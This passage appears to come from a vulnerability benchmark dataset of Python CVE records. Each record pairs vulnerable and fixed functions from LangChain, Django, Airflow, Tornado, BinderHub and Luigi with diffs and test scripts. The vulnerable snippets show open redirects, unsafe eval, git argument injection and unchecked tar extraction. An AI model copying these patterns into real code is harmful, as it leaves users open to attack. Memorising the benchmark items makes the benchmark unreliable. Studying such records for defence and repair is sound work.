        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/langchain-ai/langchain",
    "patch_url": [
      "https://github.com/langchain-ai/langchain/commit/7b13292e3544b2f5f2bfb8a27a062ea2b0c34561"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_223_1",
        "commit": "b809c24",
        "file_path": "libs/experimental/langchain_experimental/sql/vector_sql.py",
        "start_line": 86,
        "end_line": 95,
        "snippet": "def get_result_from_sqldb(\n    db: SQLDatabase, cmd: str\n) -> Union[str, List[Dict[str, Any]], Dict[str, Any]]:\n    result = db._execute(cmd, fetch=\"all\")  # type: ignore\n    if isinstance(result, list):\n        return [{k: _try_eval(v) for k, v in dict(d._asdict()).items()} for d in result]\n    else:\n        return {\n            k: _try_eval(v) for k, v in dict(result._asdict()).items()  # type: ignore\n        }"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_223_1",
        "commit": "7b13292",
        "file_path": "libs/experimental/langchain_experimental/sql/vector_sql.py",
        "start_line": 79,
        "end_line": 83,
        "snippet": "def get_result_from_sqldb(\n    db: SQLDatabase, cmd: str\n) -> Union[str, List[Dict[str, Any]], Dict[str, Any]]:\n    result = db._execute(cmd, fetch=\"all\")  # type: ignore\n    return result"
      }
    ],
    "vul_patch": "--- a/libs/experimental/langchain_experimental/sql/vector_sql.py\n+++ b/libs/experimental/langchain_experimental/sql/vector_sql.py\n@@ -2,9 +2,4 @@\n     db: SQLDatabase, cmd: str\n ) -> Union[str, List[Dict[str, Any]], Dict[str, Any]]:\n     result = db._execute(cmd, fetch=\"all\")  # type: ignore\n-    if isinstance(result, list):\n-        return [{k: _try_eval(v) for k, v in dict(d._asdict()).items()} for d in result]\n-    else:\n-        return {\n-            k: _try_eval(v) for k, v in dict(result._asdict()).items()  # type: ignore\n-        }\n+    return result\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2018-14574",
    "cve_description": "django.middleware.common.CommonMiddleware in Django 1.11.x before 1.11.15 and 2.0.x before 2.0.8 has an Open Redirect.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/d6eaee092709aad477a9894598496c6deec532ff",
      "https://github.com/django/django/commit/c4e5ff7fdb5fce447675e90291fd33fddd052b3c",
      "https://github.com/django/django/commit/6fffc3c6d420e44f4029d5643f38d00a39b08525"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_10_1",
        "commit": "af344691114e4a68334c30543bfb838996328212",
        "file_path": "django/middleware/common.py",
        "start_line": 83,
        "end_line": 102,
        "snippet": "    def get_full_path_with_slash(self, request):\n        \"\"\"\n        Return the full path of the request with a trailing slash appended.\n\n        Raise a RuntimeError if settings.DEBUG is True and request.method is\n        POST, PUT, or PATCH.\n        \"\"\"\n        new_path = request.get_full_path(force_append_slash=True)\n        if settings.DEBUG and request.method in ('POST', 'PUT', 'PATCH'):\n            raise RuntimeError(\n                \"You called this URL via %(method)s, but the URL doesn't end \"\n                \"in a slash and you have APPEND_SLASH set. Django can't \"\n                \"redirect to the slash URL while maintaining %(method)s data. \"\n                \"Change your form to point to %(url)s (note the trailing \"\n                \"slash), or set APPEND_SLASH=False in your Django settings.\" % {\n                    'method': request.method,\n                    'url': request.get_host() + new_path,\n                }\n            )\n        return new_path"
      },
      {
        "id": "vul_py_10_2",
        "commit": "af344691114e4a68334c30543bfb838996328212",
        "file_path": "django/urls/resolvers.py",
        "start_line": 564,
        "end_line": 636,
        "snippet": "    def _reverse_with_prefix(self, lookup_view, _prefix, *args, **kwargs):\n        if args and kwargs:\n            raise ValueError(\"Don't mix *args and **kwargs in call to reverse()!\")\n\n        if not self._populated:\n            self._populate()\n\n        possibilities = self.reverse_dict.getlist(lookup_view)\n\n        for possibility, pattern, defaults, converters in possibilities:\n            for result, params in possibility:\n                if args:\n                    if len(args) != len(params):\n                        continue\n                    candidate_subs = dict(zip(params, args))\n                else:\n                    if set(kwargs).symmetric_difference(params).difference(defaults):\n                        continue\n                    matches = True\n                    for k, v in defaults.items():\n                        if kwargs.get(k, v) != v:\n                            matches = False\n                            break\n                    if not matches:\n                        continue\n                    candidate_subs = kwargs\n                # Convert the candidate subs to text using Converter.to_url().\n                text_candidate_subs = {}\n                for k, v in candidate_subs.items():\n                    if k in converters:\n                        text_candidate_subs[k] = converters[k].to_url(v)\n                    else:\n                        text_candidate_subs[k] = str(v)\n                # WSGI provides decoded URLs, without %xx escapes, and the URL\n                # resolver operates on such URLs. First substitute arguments\n                # without quoting to build a decoded URL and look for a match.\n                # Then, if we have a match, redo the substitution with quoted\n                # arguments in order to return a properly encoded URL.\n                candidate_pat = _prefix.replace('%', '%%') + result\n                if re.search('^%s%s' % (re.escape(_prefix), pattern), candidate_pat % text_candidate_subs):\n                    # safe characters from `pchar` definition of RFC 3986\n                    url = quote(candidate_pat % text_candidate_subs, safe=RFC3986_SUBDELIMS + '/~:@')\n                    # Don't allow construction of scheme relative urls.\n                    if url.startswith('//'):\n                        url = '/%%2F%s' % url[2:]\n                    return url\n        # lookup_view can be URL name or callable, but callables are not\n        # friendly in error messages.\n        m = getattr(lookup_view, '__module__', None)\n        n = getattr(lookup_view, '__name__', None)\n        if m is not None and n is not None:\n            lookup_view_s = \"%s.%s\" % (m, n)\n        else:\n            lookup_view_s = lookup_view\n\n        patterns = [pattern for (_, pattern, _, _) in possibilities]\n        if patterns:\n            if args:\n                arg_msg = \"arguments '%s'\" % (args,)\n            elif kwargs:\n                arg_msg = \"keyword arguments '%s'\" % (kwargs,)\n            else:\n                arg_msg = \"no arguments\"\n            msg = (\n                \"Reverse for '%s' with %s not found. %d pattern(s) tried: %s\" %\n                (lookup_view_s, arg_msg, len(patterns), patterns)\n            )\n        else:\n            msg = (\n                \"Reverse for '%(view)s' not found. '%(view)s' is not \"\n                \"a valid view function or pattern name.\" % {'view': lookup_view_s}\n            )\n        raise NoReverseMatch(msg)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_10_1",
        "commit": "6fffc3c6d420e44f4029d5643f38d00a39b08525",
        "file_path": "django/middleware/common.py",
        "start_line": 84,
        "end_line": 105,
        "snippet": "    def get_full_path_with_slash(self, request):\n        \"\"\"\n        Return the full path of the request with a trailing slash appended.\n\n        Raise a RuntimeError if settings.DEBUG is True and request.method is\n        POST, PUT, or PATCH.\n        \"\"\"\n        new_path = request.get_full_path(force_append_slash=True)\n        # Prevent construction of scheme relative urls.\n        new_path = escape_leading_slashes(new_path)\n        if settings.DEBUG and request.method in ('POST', 'PUT', 'PATCH'):\n            raise RuntimeError(\n                \"You called this URL via %(method)s, but the URL doesn't end \"\n                \"in a slash and you have APPEND_SLASH set. Django can't \"\n                \"redirect to the slash URL while maintaining %(method)s data. \"\n                \"Change your form to point to %(url)s (note the trailing \"\n                \"slash), or set APPEND_SLASH=False in your Django settings.\" % {\n                    'method': request.method,\n                    'url': request.get_host() + new_path,\n                }\n            )\n        return new_path"
      },
      {
        "id": "fix_py_10_2",
        "commit": "6fffc3c6d420e44f4029d5643f38d00a39b08525",
        "file_path": "django/urls/resolvers.py",
        "start_line": 564,
        "end_line": 634,
        "snippet": "    def _reverse_with_prefix(self, lookup_view, _prefix, *args, **kwargs):\n        if args and kwargs:\n            raise ValueError(\"Don't mix *args and **kwargs in call to reverse()!\")\n\n        if not self._populated:\n            self._populate()\n\n        possibilities = self.reverse_dict.getlist(lookup_view)\n\n        for possibility, pattern, defaults, converters in possibilities:\n            for result, params in possibility:\n                if args:\n                    if len(args) != len(params):\n                        continue\n                    candidate_subs = dict(zip(params, args))\n                else:\n                    if set(kwargs).symmetric_difference(params).difference(defaults):\n                        continue\n                    matches = True\n                    for k, v in defaults.items():\n                        if kwargs.get(k, v) != v:\n                            matches = False\n                            break\n                    if not matches:\n                        continue\n                    candidate_subs = kwargs\n                # Convert the candidate subs to text using Converter.to_url().\n                text_candidate_subs = {}\n                for k, v in candidate_subs.items():\n                    if k in converters:\n                        text_candidate_subs[k] = converters[k].to_url(v)\n                    else:\n                        text_candidate_subs[k] = str(v)\n                # WSGI provides decoded URLs, without %xx escapes, and the URL\n                # resolver operates on such URLs. First substitute arguments\n                # without quoting to build a decoded URL and look for a match.\n                # Then, if we have a match, redo the substitution with quoted\n                # arguments in order to return a properly encoded URL.\n                candidate_pat = _prefix.replace('%', '%%') + result\n                if re.search('^%s%s' % (re.escape(_prefix), pattern), candidate_pat % text_candidate_subs):\n                    # safe characters from `pchar` definition of RFC 3986\n                    url = quote(candidate_pat % text_candidate_subs, safe=RFC3986_SUBDELIMS + '/~:@')\n                    # Don't allow construction of scheme relative urls.\n                    return escape_leading_slashes(url)\n        # lookup_view can be URL name or callable, but callables are not\n        # friendly in error messages.\n        m = getattr(lookup_view, '__module__', None)\n        n = getattr(lookup_view, '__name__', None)\n        if m is not None and n is not None:\n            lookup_view_s = \"%s.%s\" % (m, n)\n        else:\n            lookup_view_s = lookup_view\n\n        patterns = [pattern for (_, pattern, _, _) in possibilities]\n        if patterns:\n            if args:\n                arg_msg = \"arguments '%s'\" % (args,)\n            elif kwargs:\n                arg_msg = \"keyword arguments '%s'\" % (kwargs,)\n            else:\n                arg_msg = \"no arguments\"\n            msg = (\n                \"Reverse for '%s' with %s not found. %d pattern(s) tried: %s\" %\n                (lookup_view_s, arg_msg, len(patterns), patterns)\n            )\n        else:\n            msg = (\n                \"Reverse for '%(view)s' not found. '%(view)s' is not \"\n                \"a valid view function or pattern name.\" % {'view': lookup_view_s}\n            )\n        raise NoReverseMatch(msg)"
      }
    ],
    "vul_patch": "--- a/django/middleware/common.py\n+++ b/django/middleware/common.py\n@@ -6,6 +6,8 @@\n         POST, PUT, or PATCH.\n         \"\"\"\n         new_path = request.get_full_path(force_append_slash=True)\n+        # Prevent construction of scheme relative urls.\n+        new_path = escape_leading_slashes(new_path)\n         if settings.DEBUG and request.method in ('POST', 'PUT', 'PATCH'):\n             raise RuntimeError(\n                 \"You called this URL via %(method)s, but the URL doesn't end \"\n\n--- a/django/urls/resolvers.py\n+++ b/django/urls/resolvers.py\n@@ -41,9 +41,7 @@\n                     # safe characters from `pchar` definition of RFC 3986\n                     url = quote(candidate_pat % text_candidate_subs, safe=RFC3986_SUBDELIMS + '/~:@')\n                     # Don't allow construction of scheme relative urls.\n-                    if url.startswith('//'):\n-                        url = '/%%2F%s' % url[2:]\n-                    return url\n+                    return escape_leading_slashes(url)\n         # lookup_view can be URL name or callable, but callables are not\n         # friendly in error messages.\n         m = getattr(lookup_view, '__module__', None)\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2018-14574:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2018-14574/bin/python ./runtests.py middleware.tests.CommonMiddlewareTest.test_append_slash_leading_slashes utils_tests.test_http.EscapeLeadingSlashesTests\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2018-14574:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2018-14574/bin/python ./runtests.py middleware.tests\n"
  },
  {
    "cve_id": "CVE-2024-45034",
    "cve_description": "Apache Airflow versions before 2.10.1 have a vulnerability that allows\u00a0DAG authors to add local settings to the DAG folder and get it executed by the scheduler, where the scheduler is not supposed to execute code submitted by the DAG author. \nUsers are advised to upgrade to version 2.10.1 or later, which has fixed the vulnerability.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/apache/airflow",
    "patch_url": [
      "https://github.com/apache/airflow/commit/03e01e76d2203d37aa645096df195b4328665f6d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_176_1",
        "commit": "ceb6051",
        "file_path": "airflow/settings.py",
        "start_line": 678,
        "end_line": 690,
        "snippet": "def prepare_syspath():\n    \"\"\"Ensure certain subfolders of AIRFLOW_HOME are on the classpath.\"\"\"\n    if DAGS_FOLDER not in sys.path:\n        sys.path.append(DAGS_FOLDER)\n\n    # Add ./config/ for loading custom log parsers etc, or\n    # airflow_local_settings etc.\n    config_path = os.path.join(AIRFLOW_HOME, \"config\")\n    if config_path not in sys.path:\n        sys.path.append(config_path)\n\n    if PLUGINS_FOLDER not in sys.path:\n        sys.path.append(PLUGINS_FOLDER)"
      },
      {
        "id": "vul_py_176_2",
        "commit": "ceb6051",
        "file_path": "airflow/settings.py",
        "start_line": 771,
        "end_line": 793,
        "snippet": "def initialize():\n    \"\"\"Initialize Airflow with all the settings from this file.\"\"\"\n    configure_vars()\n    prepare_syspath()\n    configure_policy_plugin_manager()\n    # Load policy plugins _before_ importing airflow_local_settings, as Pluggy uses LIFO and we want anything\n    # in airflow_local_settings to take precendec\n    load_policy_plugins(POLICY_PLUGIN_MANAGER)\n    import_local_settings()\n    global LOGGING_CLASS_PATH\n    LOGGING_CLASS_PATH = configure_logging()\n    State.state_color.update(STATE_COLORS)\n\n    configure_adapters()\n    # The webservers import this file from models.py with the default settings.\n    configure_orm()\n    configure_action_logging()\n\n    # Run any custom runtime checks that needs to be executed for providers\n    run_providers_custom_runtime_checks()\n\n    # Ensure we close DB connections at scheduler and gunicorn worker terminations\n    atexit.register(dispose_orm)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_176_1",
        "commit": "03e01e7",
        "file_path": "airflow/settings.py",
        "start_line": 678,
        "end_line": 687,
        "snippet": "def prepare_syspath_for_config_and_plugins():\n    \"\"\"Update sys.path for the config and plugins directories.\"\"\"\n    # Add ./config/ for loading custom log parsers etc, or\n    # airflow_local_settings etc.\n    config_path = os.path.join(AIRFLOW_HOME, \"config\")\n    if config_path not in sys.path:\n        sys.path.append(config_path)\n\n    if PLUGINS_FOLDER not in sys.path:\n        sys.path.append(PLUGINS_FOLDER)"
      },
      {
        "id": "fix_py_176_2",
        "commit": "03e01e7",
        "file_path": "airflow/settings.py",
        "start_line": 774,
        "end_line": 797,
        "snippet": "def initialize():\n    \"\"\"Initialize Airflow with all the settings from this file.\"\"\"\n    configure_vars()\n    prepare_syspath_for_config_and_plugins()\n    configure_policy_plugin_manager()\n    # Load policy plugins _before_ importing airflow_local_settings, as Pluggy uses LIFO and we want anything\n    # in airflow_local_settings to take precendec\n    load_policy_plugins(POLICY_PLUGIN_MANAGER)\n    import_local_settings()\n    prepare_syspath_for_dags_folder()\n    global LOGGING_CLASS_PATH\n    LOGGING_CLASS_PATH = configure_logging()\n    State.state_color.update(STATE_COLORS)\n\n    configure_adapters()\n    # The webservers import this file from models.py with the default settings.\n    configure_orm()\n    configure_action_logging()\n\n    # Run any custom runtime checks that needs to be executed for providers\n    run_providers_custom_runtime_checks()\n\n    # Ensure we close DB connections at scheduler and gunicorn worker terminations\n    atexit.register(dispose_orm)"
      },
      {
        "id": "fix_py_176_3",
        "commit": "03e01e7",
        "file_path": "airflow/settings.py",
        "start_line": 690,
        "end_line": 693,
        "snippet": "def prepare_syspath_for_dags_folder():\n    \"\"\"Update sys.path to include the DAGs folder.\"\"\"\n    if DAGS_FOLDER not in sys.path:\n        sys.path.append(DAGS_FOLDER)"
      }
    ],
    "vul_patch": "--- a/airflow/settings.py\n+++ b/airflow/settings.py\n@@ -1,8 +1,5 @@\n-def prepare_syspath():\n-    \"\"\"Ensure certain subfolders of AIRFLOW_HOME are on the classpath.\"\"\"\n-    if DAGS_FOLDER not in sys.path:\n-        sys.path.append(DAGS_FOLDER)\n-\n+def prepare_syspath_for_config_and_plugins():\n+    \"\"\"Update sys.path for the config and plugins directories.\"\"\"\n     # Add ./config/ for loading custom log parsers etc, or\n     # airflow_local_settings etc.\n     config_path = os.path.join(AIRFLOW_HOME, \"config\")\n\n--- a/airflow/settings.py\n+++ b/airflow/settings.py\n@@ -1,12 +1,13 @@\n def initialize():\n     \"\"\"Initialize Airflow with all the settings from this file.\"\"\"\n     configure_vars()\n-    prepare_syspath()\n+    prepare_syspath_for_config_and_plugins()\n     configure_policy_plugin_manager()\n     # Load policy plugins _before_ importing airflow_local_settings, as Pluggy uses LIFO and we want anything\n     # in airflow_local_settings to take precendec\n     load_policy_plugins(POLICY_PLUGIN_MANAGER)\n     import_local_settings()\n+    prepare_syspath_for_dags_folder()\n     global LOGGING_CLASS_PATH\n     LOGGING_CLASS_PATH = configure_logging()\n     State.state_color.update(STATE_COLORS)\n\n--- /dev/null\n+++ b/airflow/settings.py\n@@ -0,0 +1,4 @@\n+def prepare_syspath_for_dags_folder():\n+    \"\"\"Update sys.path to include the DAGs folder.\"\"\"\n+    if DAGS_FOLDER not in sys.path:\n+        sys.path.append(DAGS_FOLDER)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-28370",
    "cve_description": "Open redirect vulnerability in Tornado versions 6.3.1 and earlier allows a remote unauthenticated attacker to redirect a user to an arbitrary web site and conduct a phishing attack by having user access a specially crafted URL.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/tornadoweb/tornado",
    "patch_url": [
      "https://github.com/tornadoweb/tornado/commit/32ad07c54e607839273b4e1819c347f5c8976b2f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_351_1",
        "commit": "e0fa53ee96db720dc7800d0248c39a4ffb8911e9",
        "file_path": "tornado/web.py",
        "start_line": 2841,
        "end_line": 2889,
        "snippet": "    def validate_absolute_path(self, root: str, absolute_path: str) -> Optional[str]:\n        \"\"\"Validate and return the absolute path.\n\n        ``root`` is the configured path for the `StaticFileHandler`,\n        and ``path`` is the result of `get_absolute_path`\n\n        This is an instance method called during request processing,\n        so it may raise `HTTPError` or use methods like\n        `RequestHandler.redirect` (return None after redirecting to\n        halt further processing).  This is where 404 errors for missing files\n        are generated.\n\n        This method may modify the path before returning it, but note that\n        any such modifications will not be understood by `make_static_url`.\n\n        In instance methods, this method's result is available as\n        ``self.absolute_path``.\n\n        .. versionadded:: 3.1\n        \"\"\"\n        # os.path.abspath strips a trailing /.\n        # We must add it back to `root` so that we only match files\n        # in a directory named `root` instead of files starting with\n        # that prefix.\n        root = os.path.abspath(root)\n        if not root.endswith(os.path.sep):\n            # abspath always removes a trailing slash, except when\n            # root is '/'. This is an unusual case, but several projects\n            # have independently discovered this technique to disable\n            # Tornado's path validation and (hopefully) do their own,\n            # so we need to support it.\n            root += os.path.sep\n        # The trailing slash also needs to be temporarily added back\n        # the requested path so a request to root/ will match.\n        if not (absolute_path + os.path.sep).startswith(root):\n            raise HTTPError(403, \"%s is not in root static directory\", self.path)\n        if os.path.isdir(absolute_path) and self.default_filename is not None:\n            # need to look at the request.path here for when path is empty\n            # but there is some prefix to the path that was already\n            # trimmed by the routing\n            if not self.request.path.endswith(\"/\"):\n                self.redirect(self.request.path + \"/\", permanent=True)\n                return None\n            absolute_path = os.path.join(absolute_path, self.default_filename)\n        if not os.path.exists(absolute_path):\n            raise HTTPError(404)\n        if not os.path.isfile(absolute_path):\n            raise HTTPError(403, \"%s is not a file\", self.path)\n        return absolute_path"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_351_1",
        "commit": "32ad07c54e607839273b4e1819c347f5c8976b2f",
        "file_path": "tornado/web.py",
        "start_line": 2841,
        "end_line": 2898,
        "snippet": "    def validate_absolute_path(self, root: str, absolute_path: str) -> Optional[str]:\n        \"\"\"Validate and return the absolute path.\n\n        ``root`` is the configured path for the `StaticFileHandler`,\n        and ``path`` is the result of `get_absolute_path`\n\n        This is an instance method called during request processing,\n        so it may raise `HTTPError` or use methods like\n        `RequestHandler.redirect` (return None after redirecting to\n        halt further processing).  This is where 404 errors for missing files\n        are generated.\n\n        This method may modify the path before returning it, but note that\n        any such modifications will not be understood by `make_static_url`.\n\n        In instance methods, this method's result is available as\n        ``self.absolute_path``.\n\n        .. versionadded:: 3.1\n        \"\"\"\n        # os.path.abspath strips a trailing /.\n        # We must add it back to `root` so that we only match files\n        # in a directory named `root` instead of files starting with\n        # that prefix.\n        root = os.path.abspath(root)\n        if not root.endswith(os.path.sep):\n            # abspath always removes a trailing slash, except when\n            # root is '/'. This is an unusual case, but several projects\n            # have independently discovered this technique to disable\n            # Tornado's path validation and (hopefully) do their own,\n            # so we need to support it.\n            root += os.path.sep\n        # The trailing slash also needs to be temporarily added back\n        # the requested path so a request to root/ will match.\n        if not (absolute_path + os.path.sep).startswith(root):\n            raise HTTPError(403, \"%s is not in root static directory\", self.path)\n        if os.path.isdir(absolute_path) and self.default_filename is not None:\n            # need to look at the request.path here for when path is empty\n            # but there is some prefix to the path that was already\n            # trimmed by the routing\n            if not self.request.path.endswith(\"/\"):\n                if self.request.path.startswith(\"//\"):\n                    # A redirect with two initial slashes is a \"protocol-relative\" URL.\n                    # This means the next path segment is treated as a hostname instead\n                    # of a part of the path, making this effectively an open redirect.\n                    # Reject paths starting with two slashes to prevent this.\n                    # This is only reachable under certain configurations.\n                    raise HTTPError(\n                        403, \"cannot redirect path with two initial slashes\"\n                    )\n                self.redirect(self.request.path + \"/\", permanent=True)\n                return None\n            absolute_path = os.path.join(absolute_path, self.default_filename)\n        if not os.path.exists(absolute_path):\n            raise HTTPError(404)\n        if not os.path.isfile(absolute_path):\n            raise HTTPError(403, \"%s is not a file\", self.path)\n        return absolute_path"
      }
    ],
    "vul_patch": "--- a/tornado/web.py\n+++ b/tornado/web.py\n@@ -39,6 +39,15 @@\n             # but there is some prefix to the path that was already\n             # trimmed by the routing\n             if not self.request.path.endswith(\"/\"):\n+                if self.request.path.startswith(\"//\"):\n+                    # A redirect with two initial slashes is a \"protocol-relative\" URL.\n+                    # This means the next path segment is treated as a hostname instead\n+                    # of a part of the path, making this effectively an open redirect.\n+                    # Reject paths starting with two slashes to prevent this.\n+                    # This is only reachable under certain configurations.\n+                    raise HTTPError(\n+                        403, \"cannot redirect path with two initial slashes\"\n+                    )\n                 self.redirect(self.request.path + \"/\", permanent=True)\n                 return None\n             absolute_path = os.path.join(absolute_path, self.default_filename)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-39159",
    "cve_description": "BinderHub is a kubernetes-based cloud service that allows users to share reproducible interactive computing environments from code repositories. In affected versions a remote code execution vulnerability has been identified in BinderHub, where providing BinderHub with maliciously crafted input could execute code in the BinderHub context, with the potential to egress credentials of the BinderHub deployment, including JupyterHub API tokens, kubernetes service accounts, and docker registry credentials. This may provide the ability to manipulate images and other user created pods in the deployment, with the potential to escalate to the host depending on the underlying kubernetes configuration. Users are advised to update to version 0.2.0-n653. If users are unable to update they may disable the git repo provider by specifying the `BinderHub.repo_providers` as a workaround.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/jupyterhub/binderhub",
    "patch_url": [
      "https://github.com/jupyterhub/binderhub/commit/195caac172690456dcdc8cc7a6ca50e05abf8182",
      "https://github.com/jupyterhub/binderhub/commit/195caac172690456dcdc8cc7a6ca50e05abf8182.patch"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_193_1",
        "commit": "034430a",
        "file_path": "binderhub/repoproviders.py",
        "start_line": 478,
        "end_line": 500,
        "snippet": "    async def get_resolved_ref(self):\n        if hasattr(self, 'resolved_ref'):\n            return self.resolved_ref\n\n        try:\n            # Check if the reference is a valid SHA hash\n            self.sha1_validate(self.unresolved_ref)\n        except ValueError:\n            # The ref is a head/tag and we resolve it using `git ls-remote`\n            command = [\"git\", \"ls-remote\", self.repo, self.unresolved_ref]\n            result = subprocess.run(command, universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            if result.returncode:\n                raise RuntimeError(\"Unable to run git ls-remote to get the `resolved_ref`: {}\".format(result.stderr))\n            if not result.stdout:\n                return None\n            resolved_ref = result.stdout.split(None, 1)[0]\n            self.sha1_validate(resolved_ref)\n            self.resolved_ref = resolved_ref\n        else:\n            # The ref already was a valid SHA hash\n            self.resolved_ref = self.unresolved_ref\n\n        return self.resolved_ref"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_193_1",
        "commit": "195caac",
        "file_path": "binderhub/repoproviders.py",
        "start_line": 478,
        "end_line": 500,
        "snippet": "    async def get_resolved_ref(self):\n        if hasattr(self, 'resolved_ref'):\n            return self.resolved_ref\n\n        try:\n            # Check if the reference is a valid SHA hash\n            self.sha1_validate(self.unresolved_ref)\n        except ValueError:\n            # The ref is a head/tag and we resolve it using `git ls-remote`\n            command = [\"git\", \"ls-remote\", \"--\", self.repo, self.unresolved_ref]\n            result = subprocess.run(command, universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            if result.returncode:\n                raise RuntimeError(\"Unable to run git ls-remote to get the `resolved_ref`: {}\".format(result.stderr))\n            if not result.stdout:\n                return None\n            resolved_ref = result.stdout.split(None, 1)[0]\n            self.sha1_validate(resolved_ref)\n            self.resolved_ref = resolved_ref\n        else:\n            # The ref already was a valid SHA hash\n            self.resolved_ref = self.unresolved_ref\n\n        return self.resolved_ref"
      }
    ],
    "vul_patch": "--- a/binderhub/repoproviders.py\n+++ b/binderhub/repoproviders.py\n@@ -7,7 +7,7 @@\n             self.sha1_validate(self.unresolved_ref)\n         except ValueError:\n             # The ref is a head/tag and we resolve it using `git ls-remote`\n-            command = [\"git\", \"ls-remote\", self.repo, self.unresolved_ref]\n+            command = [\"git\", \"ls-remote\", \"--\", self.repo, self.unresolved_ref]\n             result = subprocess.run(command, universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n             if result.returncode:\n                 raise RuntimeError(\"Unable to run git ls-remote to get the `resolved_ref`: {}\".format(result.stderr))\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-21542",
    "cve_description": "Versions of the package luigi before 3.6.0 are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) due to improper destination file path validation in the _extract_packages_archive function.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/spotify/luigi",
    "patch_url": [
      "https://github.com/spotify/luigi/commit/b5d1b965ead7d9f777a3216369b5baf23ec08999"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_36_1",
        "commit": "c9a0d20",
        "file_path": "luigi/contrib/lsf_runner.py",
        "start_line": 47,
        "end_line": 62,
        "snippet": "def extract_packages_archive(work_dir):\n    package_file = os.path.join(work_dir, \"packages.tar\")\n    if not os.path.exists(package_file):\n        return\n\n    curdir = os.path.abspath(os.curdir)\n\n    os.chdir(work_dir)\n    tar = tarfile.open(package_file)\n    for tarinfo in tar:\n        tar.extract(tarinfo)\n    tar.close()\n    if '' not in sys.path:\n        sys.path.insert(0, '')\n\n    os.chdir(curdir)"
      },
      {
        "id": "vul_py_36_2",
        "commit": "c9a0d20",
        "file_path": "luigi/contrib/sge_runner.py",
        "start_line": 59,
        "end_line": 74,
        "snippet": "def _extract_packages_archive(work_dir):\n    package_file = os.path.join(work_dir, \"packages.tar\")\n    if not os.path.exists(package_file):\n        return\n\n    curdir = os.path.abspath(os.curdir)\n\n    os.chdir(work_dir)\n    tar = tarfile.open(package_file)\n    for tarinfo in tar:\n        tar.extract(tarinfo)\n    tar.close()\n    if '' not in sys.path:\n        sys.path.insert(0, '')\n\n    os.chdir(curdir)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_36_1",
        "commit": "b5d1b96",
        "file_path": "luigi/contrib/lsf_runner.py",
        "start_line": 31,
        "end_line": 31,
        "snippet": "from luigi.safe_extractor import SafeExtractor"
      },
      {
        "id": "fix_py_36_2",
        "commit": "b5d1b96",
        "file_path": "luigi/contrib/lsf_runner.py",
